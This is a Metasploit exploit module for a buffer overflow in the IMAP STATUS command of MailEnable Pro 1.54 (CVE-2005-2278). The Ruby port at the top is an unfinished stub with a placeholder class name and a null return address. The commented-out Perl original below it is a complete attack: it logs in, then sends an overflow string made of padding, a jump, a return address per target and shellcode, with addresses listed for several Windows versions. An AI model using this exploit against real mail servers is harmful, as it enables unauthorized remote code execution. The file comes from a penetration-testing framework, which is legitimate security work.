require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MailEnable Pro (1.54) IMAP STATUS Request Buffer Overflow',
			'Description'    => %q{
				MailEnable's IMAP server contains a buffer overflow
				vulnerability in the STATUS command. With proper
				credentials, this could allow for the execution of arbitrary
				code.
					
			},
			'Author'         => [ 'y0 <y0@w00t-shell.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2005-2278'],
					[ 'BID', '14243'],
					[ 'NSS', '19193'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 450,
					'BadChars' => "\x00\x0a\x0d\x20",
					'Prepend'  => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jul 13 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mailenable_imap;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	'Name'    => 'MailEnable Pro (1.54) IMAP STATUS Request Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'y0 <y0 [at] w00t-shell.net>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'IMAP Username'],
		'PASS'  => [1, 'DATA', 'IMAP Password'],
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'thread' },
	'Payload' =>
	  {
		'Space'     => 450,
		'BadChars'  => "\x00\x0a\x0d\x20",
		'Prepend'   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
MailEnable's IMAP server contains a buffer overflow vulnerability
in the STATUS command. With proper credentials, this could allow
for the execution of arbitrary code. 
}),

	'Refs'  =>
	  [
		['CVE','2005-2278'],
		['BID', '14243' ],
		['NSS', '19193' ],
	  ],

	'Targets' =>
	  [
		['MailEnable 1.54 Pro Universal', 9273, 0x1001c019], #MEAISP.DLL
		['Windows XP Pro SP0/SP1 English', 9273, 0x71aa32ad ],
		['Windows 2000 Pro English ALL', 9273, 0x75022ac4 ],
		['Windows 2003 Server English', 9273, 0x7ffc0638 ],
	  ],

	'Keys' => ['imap'],

	'DisclosureDate' => 'Jul 13 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;
	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $user        = $self->GetVar('USER');
	my $pass        = $self->GetVar('PASS');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );
	  
	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1, 3);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);

	my $sploit = "a001 LOGIN $user $pass\r\n";
	$sock->Send($sploit);
	my $resp = $sock->Recv(-1, 3);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}
	
	if($resp !~ /^a001 OK LOGIN/) {
		$self->PrintLine('Login error: ' . $resp);
		return;
	}
	
	$self->PrintLine('[*] Logged in, sending overflow...');
	my $splat = Pex::Text::UpperCaseText($target->[1]);

	$sploit =
	  "a001 STATUS ". '".'. "\x00".
	  $splat. "\xeb\x06". pack('V', $target->[2]). $shellcode.
	  '"'. " (UIDNEXT UIDVALIDITY MESSAGES UNSEEN RECENT)". "\r\n";

	$sock->Send($sploit);
	my $resp = $sock->Recv(-1, 3);
	if(length($resp)) {
		$self->PrintLine('[*] Got response, bad: ' . $resp);
	}
	
	return;
}

1;

=end


end
end	
